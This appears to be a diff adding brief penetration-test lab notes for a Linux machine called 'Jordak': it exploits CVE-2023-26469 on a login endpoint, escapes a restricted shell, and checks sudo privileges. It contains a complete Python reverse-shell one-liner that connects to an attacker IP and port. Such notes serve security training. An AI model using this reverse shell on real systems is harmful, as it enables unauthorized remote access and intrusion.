@@ -1,0 +1,10 @@
+Jordak - Linux, WebApp & Priv Esc:
+ - Enumerate, find, and discovery a vulnerable login endpoint
+    - CVE-2023-26469 (PoC) under github
+ - CVE-2023-26469 gain a shell
+    - restricted environment:
+        - How to get out:  export RHOST="192.168.45.249" RPORT=5555;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+
+ - Analyze sudo privileges
+
+    - sudo -l 
